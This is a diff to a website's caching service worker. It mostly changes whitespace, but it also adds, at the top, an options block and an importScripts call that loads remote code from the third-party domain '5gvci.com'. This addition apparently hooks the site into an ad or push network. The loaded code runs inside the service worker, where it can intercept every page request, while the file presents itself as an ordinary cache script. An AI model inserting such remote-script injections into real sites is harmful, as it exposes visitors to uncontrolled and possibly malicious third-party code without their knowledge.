@@ -1,3 +1,10 @@
+self.options = {
+  "domain": "5gvci.com",
+  "zoneId": 10601397
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
 const CACHE_NAME = 'beybladexmeta-cache-v1';
 const ASSETS = [
   '/',
@@ -6,7 +13,7 @@ const ASSETS = [
 
 self.addEventListener('install', (event) => {
   event.waitUntil(
-    caches.open(CACHE_NAME).then((cache) => cache.addAll(ASSETS)).catch(() => {})
+    caches.open(CACHE_NAME).then((cache) => cache.addAll(ASSETS)).catch(() => { })
   );
 });
 
@@ -31,8 +38,8 @@ self.addEventListener('fetch', (event) => {
       const fetchPromise = fetch(req).then((res) => {
         try {
           const copy = res.clone();
-          caches.open(CACHE_NAME).then((cache) => cache.put(req, copy)).catch(() => {});
-        } catch {}
+          caches.open(CACHE_NAME).then((cache) => cache.put(req, copy)).catch(() => { });
+        } catch { }
         return res;
       }).catch(() => cached || Promise.reject('no-match'));
       return cached || fetchPromise;
